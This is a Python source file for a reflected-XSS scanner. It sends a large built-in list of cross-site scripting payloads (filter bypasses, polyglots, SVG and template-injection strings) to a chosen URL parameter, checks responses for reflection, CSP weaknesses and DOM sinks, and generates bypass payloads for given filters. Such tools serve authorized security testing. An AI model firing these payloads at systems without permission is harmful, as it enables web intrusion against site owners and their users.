import re
import requests
from typing import Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()


class XSSScanner:
    PAYLOADS = {
        "basic": [
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
        ],
        "without_parentheses": [
            "<script>alert`1`</script>",
            "<script>alert`XSS`</script>",
            "<img src=x onerror=alert`1`>",
            "<svg/onload=alert`1`>",
        ],
        "without_alert": [
            "<script>confirm(1)</script>",
            "<script>prompt(1)</script>",
            "<script>print()</script>",
            "<script>eval('al'+'ert(1)')</script>",
            "<script>console.log(1)</script>",
            "<svg/onload=confirm(1)>",
            "<img src=x onerror=confirm(1)>",
        ],
        "filter_bypass": [
            "<ScRiPt>alert(1)</ScRiPt>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<script>alert(1)//</script>",
            "<script>alert(1)<!--</script>",
            "<<script>alert(1)//<</script>",
            "<img \"\"\" onerror=alert(1)//\">",
            "<img src=`x` onerror=alert(1)>",
            "'-alert(1)-'",
            "'-alert(1)//",
            "\"><script>alert(1)</script>",
            "';alert(1)//",
            "<script>window['alert'](1)</script>",
            "<script>self['alert'](1)</script>",
            "<script>window['al'+'ert'](1)</script>",
            "<script>eval(atob('YWxlcnQoMSk='))</script>",
        ],
        "polyglot": [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "%0AjAvAsCrIpT:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "'\"><img src=x onerror=alert(1)><!--",
            "\"><svg/onload=alert(1)>",
            "';alert(1)//",
            "\\\"><script>alert(1)</script>",
        ],
        "event_handlers": [
            "onfocus",
            "onmouseover",
            "onclick",
            "ondblclick",
            "onkeypress",
            "onkeydown",
            "onkeyup",
            "onload",
            "onerror",
            "onabort",
            "onresize",
            "onscroll",
            "onsubmit",
            "onchange",
            "oninput",
            "onblur",
            "onsubmit",
        ],
        "svg_payloads": [
            "<svg onload=alert(1)>",
            "<svg/onload=alert(1)>",
            "<svg onload=alert`1`>",
            "<svg><script>alert(1)</script></svg>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            "<svg><set attributeName=x to=alert(1)>",
        ],
        "template_injection": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{constructor.constructor('alert(1)')()}}",
            "${'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}",
        ],
    }

    def __init__(self, url: str, param: str, method: str = "GET", data: Optional[dict] = None, headers: Optional[dict] = None, cookies: Optional[dict] = None, timeout: int = 10):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.reflected = []
        self.vulnerable = False

    def _send(self, payload: str) -> requests.Response:
        parsed = urlparse(self.url)
        if self.method == "POST":
            test_data = self.data.copy()
            test_data[self.param] = payload
            return requests.post(
                self.url,
                data=test_data,
                headers=self.headers,
                cookies=self.cookies,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False,
            )
        else:
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[self.param] = [payload]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            return requests.get(
                new_url,
                headers=self.headers,
                cookies=self.cookies,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False,
            )

    def _check_reflection(self, response: requests.Response, payload: str) -> bool:
        return payload in response.text

    def _check_dom(self, html: str) -> list:
        dom_sinks = [
            r'document\.write\s*\(',
            r'document\.writeln\s*\(',
            r'document\.location\s*=',
            r'document\.URL',
            r'document\.referrer',
            r'window\.location\s*=',
            r'window\.location\.href\s*=',
            r'window\.location\.replace\s*\(',
            r'window\.open\s*\(',
            r'eval\s*\(',
            r'setTimeout\s*\(',
            r'setInterval\s*\(',
            r'innerHTML\s*=',
            r'outerHTML\s*=',
            r'insertAdjacentHTML\s*\(',
            r'\.html\s*\(',
            r'element\.setAttribute\s*\(',
        ]
        findings = []
        for sink in dom_sinks:
            matches = re.findall(sink, html)
            if matches:
                findings.append(sink)
        return findings

    def _check_csp(self, headers: dict) -> dict:
        csp = {
            "enabled": False,
            "report_only": False,
            "unsafe_inline": False,
            "unsafe_eval": False,
            "script_src": None,
        }
        csp_header = headers.get("Content-Security-Policy", headers.get("content-security-policy", ""))
        if csp_header:
            csp["enabled"] = True
            csp["unsafe_inline"] = "unsafe-inline" in csp_header
            csp["unsafe_eval"] = "unsafe-eval" in csp_header
            script_match = re.search(r"script-src\s+([^;]+)", csp_header)
            if script_match:
                csp["script_src"] = script_match.group(1).strip()
        report_only = headers.get("Content-Security-Policy-Report-Only", headers.get("content-security-policy-report-only", ""))
        if report_only:
            csp["report_only"] = True
        return csp

    def scan(self) -> dict:
        console.print(Panel("[bold cyan]XSS Scanner[/bold cyan]", border_style="cyan"))
        results = {
            "url": self.url,
            "param": self.param,
            "reflected": [],
            "vulnerable": False,
            "dom_sinks": [],
            "csp": {},
        }

        console.print(f"  [yellow]Testing parameter:[/yellow] {self.param}")
        console.print(f"  [yellow]Testing reflection...[/yellow]")

        test_payload = "xSsTeSt12345"
        try:
            resp = self._send(test_payload)
            if self._check_reflection(resp, test_payload):
                console.print(f"    [green]Payload reflected in response![/green]")
                results["reflected"].append(test_payload)

                csp = self._check_csp(dict(resp.headers))
                results["csp"] = csp
                if csp["enabled"]:
                    console.print(f"    [yellow]CSP detected:[/yellow] unsafe-inline={csp['unsafe_inline']}, unsafe-eval={csp['unsafe_eval']}")
                else:
                    console.print(f"    [green]No CSP detected[/green]")

                dom_sinks = self._check_dom(resp.text)
                results["dom_sinks"] = dom_sinks
                if dom_sinks:
                    console.print(f"    [yellow]DOM sinks found:[/yellow] {len(dom_sinks)}")

                console.print(f"  [yellow]Testing XSS payloads...[/yellow]")
                all_payloads = []
                for category, payloads in self.PAYLOADS.items():
                    for payload in payloads:
                        all_payloads.append((category, payload))

                for category, payload in all_payloads:
                    try:
                        resp = self._send(payload)
                        if self._check_reflection(resp, payload):
                            results["reflected"].append(payload)
                            results["vulnerable"] = True
                            console.print(f"    [bold red]VULNERABLE![/bold red] ({category}) {payload[:60]}...")
                            break
                    except requests.RequestException:
                        continue
            else:
                console.print(f"    [green]Payload not reflected[/green]")
        except requests.RequestException as e:
            console.print(f"    [red]Error: {e}[/red]")

        self.vulnerable = results["vulnerable"]
        self.reflected = results["reflected"]
        return results

    def generate_payloads(self, filter_rules: Optional[str] = None) -> list:
        console.print("[cyan]Generating XSS payloads...[/cyan]")
        payloads = []
        if not filter_rules:
            payloads = self.PAYLOADS["basic"] + self.PAYLOADS["without_parentheses"]
        else:
            filters = filter_rules.lower().split(",")
            if "alert" in filters:
                payloads.extend(self.PAYLOADS["without_alert"])
            if "parentheses" in filters or "()" in filters:
                payloads.extend(self.PAYLOADS["without_parentheses"])
            if "script" in filters:
                payloads.extend(self.PAYLOADS["svg_payloads"])
            if "event" in filters:
                for event in self.PAYLOADS["event_handlers"]:
                    payloads.append(f"<img src=x {event}=alert(1)>")
            if not payloads:
                payloads = self.PAYLOADS["filter_bypass"] + self.PAYLOADS["polyglot"]
        return payloads

    def print_results(self, results: dict):
        table = Table(title="XSS Scan Results", border_style="cyan")
        table.add_column("Property", style="bold")
        table.add_column("Value")
        table.add_row("URL", results["url"])
        table.add_row("Parameter", results["param"])
        table.add_row("Vulnerable", "YES" if results["vulnerable"] else "NO")
        if results["vulnerable"]:
            table.add_row("Reflected Payloads", str(len(results["reflected"])))
        if results["dom_sinks"]:
            table.add_row("DOM Sinks", str(len(results["dom_sinks"])))
        if results["csp"].get("enabled"):
            table.add_row("CSP", "Enabled")
            table.add_row("Unsafe Inline", str(results["csp"]["unsafe_inline"]))
            table.add_row("Unsafe Eval", str(results["csp"]["unsafe_eval"]))
        console.print(table)
